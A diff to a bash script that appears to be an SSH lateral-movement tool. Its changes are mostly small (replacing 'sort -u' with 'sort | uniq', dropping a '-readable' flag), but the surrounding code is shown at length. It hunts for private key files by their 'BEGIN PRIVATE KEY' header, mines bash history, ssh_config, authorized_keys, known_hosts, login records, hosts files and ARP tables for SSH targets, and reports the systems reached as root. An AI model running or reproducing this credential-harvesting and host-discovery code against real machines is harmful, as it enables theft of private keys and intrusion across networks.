@@ -483,7 +483,7 @@ shape_script() {
   [[ $use_retry_all_dests -eq 1 ]] || return
 
   local retried_interesting_dests
-  retried_interesting_dests="$(gen_retried_interesting_dests | sort -u)"
+  retried_interesting_dests="$(gen_retried_interesting_dests | sort | uniq)"
 
   [[ "${#retried_interesting_dests}" -gt 0 ]] || return
 
@@ -565,8 +565,8 @@ EOF
   printf "Unique systems accessed: %s\n" "${#root_ssh_hosts[@]}"
   printf "\nNeed a list of servers accessed? Run one of these commands:\n\n"
 cat <<"EOF"
-grep -oE "[a-z_][a-z0-9_-]{0,31}@[0-9\.]*$" output.log  | sort -u
-grep -oE "[a-z_][a-z0-9_-]{0,31}@\([0-9\.:]*\)$" output.log  | sort -u
+grep -oE "[a-z_][a-z0-9_-]{0,31}@[0-9\.]*$" output.log  | sort | uniq
+grep -oE "[a-z_][a-z0-9_-]{0,31}@\([0-9\.:]*\)$" output.log  | sort | uniq
 
 EOF
 
@@ -581,7 +581,7 @@ check_commands() {
   local required_commands
   local required_command
 
-  required_commands=("ssh-keygen" "readlink" "ssh" "basename" "base64" "awk" "sort" "grep" "tr" "find" "cat" "stdbuf") # "sudo" "hostname" "xargs" "getent" "ifconfig" "ipconfig" "ip" "timeout" "dscacheutil" are all semi-optional. "sed" is necessary only by the first system.
+  required_commands=("ssh-keygen" "readlink" "ssh" "basename" "base64" "awk" "sort" "uniq" "grep" "tr" "find" "cat" "stdbuf") # "sudo" "hostname" "xargs" "getent" "ifconfig" "ipconfig" "ip" "timeout" "dscacheutil" are all semi-optional. "sed" is necessary only by the first system.
 
   for required_command in "${required_commands[@]}"; do
     if ! command -v "$required_command" >/dev/null 2>&1; then
@@ -921,7 +921,7 @@ init_ssh_files() {
     while IFS= read -r ssh_file; do
       is_file "$ssh_file" || continue
       ssh_files["$ssh_file"]=1
-    done < <(${s} find -L "$ssh_folder" -type f -readable 2>/dev/null)
+    done < <(${s} find -L "$ssh_folder" -type f 2>/dev/null)
   done
 }
 
@@ -1048,7 +1048,7 @@ find_ssh_keys_paths() {
 
   while IFS= read -r ssh_file; do
     check_and_populate_keys "$ssh_file"
-  done < <(${s} find -L ${scan_paths[@]} -maxdepth "$scan_paths_depth" -type f -size +200c -size -14000c -readable -exec grep -l -m 1 -E '^----[-| ]BEGIN .{0,15}PRIVATE KEY' {} + 2>/dev/null) # Longest key is ---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----. We lose "SSH PRIVATE KEY FILE FORMAT 1.1" but oh well.
+  done < <(${s} find -L ${scan_paths[@]} -maxdepth "$scan_paths_depth" -type f -size +200c -size -14000c -exec grep -l -m 1 -E '^----[-| ]BEGIN .{0,15}PRIVATE KEY' {} + 2>/dev/null) # Longest key is ---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----. We lose "SSH PRIVATE KEY FILE FORMAT 1.1" but oh well.
 }
 
 # Given a key file path and a home directory, determine whether the key exists and corresponds to a private key or not using the appropriate home directory location where necessary.
@@ -1242,7 +1242,7 @@ find_from_bash_history() {
       [[ -z "$cached_ssh_user" ]] && add_ssh_user "$home_user" && cached_ssh_user="$home_user" # XXX: Can we parse ssh_config and detect Host [host] corresponds to a user, instead?
 
       [[ -n "$cached_ssh_user" && -n "$cached_ssh_host" ]] && add_ssh_dest "$cached_ssh_user@$cached_ssh_host"
-    done < <(${s} grep -E '^(ssh|scp|rsync) ' -- "$home_file" 2>/dev/null | sort -u)
+    done < <(${s} grep -E '^(ssh|scp|rsync) ' -- "$home_file" 2>/dev/null | sort | uniq)
   done
 }
 
@@ -1300,8 +1300,8 @@ find_from_ssh_config() {
             check_potential_key_files "$cline_val" "$home_folder"
             ;;
         esac
-      done < <(${s} grep -iE 'Host|HostName|User|IdentityFile' -- "$ssh_file" 2>/dev/null | sort -u)
-    done < <(${s} find -L "$home_folder/.ssh" -type f -readable 2>/dev/null)
+      done < <(${s} grep -iE 'Host|HostName|User|IdentityFile' -- "$ssh_file" 2>/dev/null | sort | uniq)
+    done < <(${s} find -L "$home_folder/.ssh" -type f 2>/dev/null)
   done
 }
 
@@ -1337,8 +1337,8 @@ find_from_authorized_keys() {
       while IFS= read -r ssh_host; do
         add_ssh_host "$ssh_host"
         [[ -n "$home_user" ]] && add_ssh_dest "$home_user@$ssh_host"
-      done < <(echo "$ssh_address" | awk -F"\\\'|\\\"" '{print $2}' | tr ',' '\n' | sort -u)
-    done < <(${s} grep -F 'from=' -- "$ssh_file" 2>/dev/null | awk -F"\\\'|\\\"" '{print $2}' | tr ',' '\n' | sort -u)
+      done < <(echo "$ssh_address" | awk -F"\\\'|\\\"" '{print $2}' | tr ',' '\n' | sort | uniq)
+    done < <(${s} grep -F 'from=' -- "$ssh_file" 2>/dev/null | awk -F"\\\'|\\\"" '{print $2}' | tr ',' '\n' | sort | uniq)
   done
 }
 
@@ -1350,7 +1350,7 @@ find_from_last() {
 
   while IFS= read -r ssh_dest; do
     add_ssh_dest "$ssh_dest"
-  done < <(last -aiw 2>/dev/null | grep -v reboot | awk '/\./ {print $1":"$NF}' | sort -u)
+  done < <(last -aiw 2>/dev/null | grep -v reboot | awk '/\./ {print $1":"$NF}' | sort | uniq)
 
 }
 
@@ -1387,7 +1387,7 @@ find_from_known_hosts() {
       add_ssh_dest "$ssh_dest"
 
       [[ -n "$home_user" && -n "$ssh_host" ]] && add_ssh_dest "$home_user@$ssh_host"
-    done < <(${s} "${sshkeygen[@]}" "$ssh_file" 2>/dev/null | grep -F -v '|1|' | tr '[:upper:]' '[:lower:]' | grep -oE ':[a-z0-9]{2} .*' | awk '{print $2}' | sort -u)
+    done < <(${s} "${sshkeygen[@]}" "$ssh_file" 2>/dev/null | grep -F -v '|1|' | tr '[:upper:]' '[:lower:]' | grep -oE ':[a-z0-9]{2} .*' | awk '{print $2}' | sort | uniq)
   done
 }
 
@@ -1397,11 +1397,11 @@ find_from_hosts() {
 
   while IFS= read -r ssh_host; do
     add_ssh_host "$ssh_host"
-  done < <(getent ahostsv4 2>/dev/null | awk -F"  " '{print $NF}' | tr ' ' '\n' | sort -u) # skip ipv6 for now, might be tab.
+  done < <(getent ahostsv4 2>/dev/null | awk -F"  " '{print $NF}' | tr ' ' '\n' | sort | uniq) # skip ipv6 for now, might be tab.
 
   while IFS=": " read -r _ ssh_host; do
     add_ssh_host "$ssh_host"
-  done < <(dscacheutil -q host 2>/dev/null | grep -F 'ip_address:' | sort -u)
+  done < <(dscacheutil -q host 2>/dev/null | grep -F 'ip_address:' | sort | uniq)
 }
 
 # Neighbouring hosts that announce themselves via ARP may be interesting.
@@ -1410,11 +1410,11 @@ find_arp_neighbours() {
 
   while IFS= read -r ssh_host; do
     add_ssh_host "$ssh_host"
-  done < <(ip neigh 2>/dev/null | awk '$1 !~ /(\.1$|:)/ {print $1}' | sort -u) # ignore ipv6 and ignore gateway
+  done < <(ip neigh 2>/dev/null | awk '$1 !~ /(\.1$|:)/ {print $1}' | sort | uniq) # ignore ipv6 and ignore gateway
 
   while IFS= read -r ssh_host; do
     add_ssh_host "$ssh_host"
-  done < <(arp -a 2>/dev/null | awk -F"\\\(|\\\)" '{print $2}' | awk '$1 !~ /(\.1$|:)/ {print $1}' | sort -u) # ignore ipv6 and ignore gateway
+  done < <(arp -a 2>/dev/null | awk -F"\\\(|\\\)" '{print $2}' | awk '$1 !~ /(\.1$|:)/ {print $1}' | sort | uniq) # ignore ipv6 and ignore gateway
 }
 
 # Neighbouring d-block hosts (x.x.x.0-x.x.x.255) may be interesting.
